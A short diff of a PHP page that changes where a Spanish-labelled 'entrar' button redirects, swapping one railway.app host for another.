@@ -173,7 +173,7 @@ padding:20px;
 <?php
 // 🚀 PROCESAR BOTÓN
 if(isset($_POST['entrar'])){
-    header("Location: https://banfin-production.up.railway.app");
+    header("Location: https://bnpr-production.up.railway.app");
     exit;
 }
 ?>
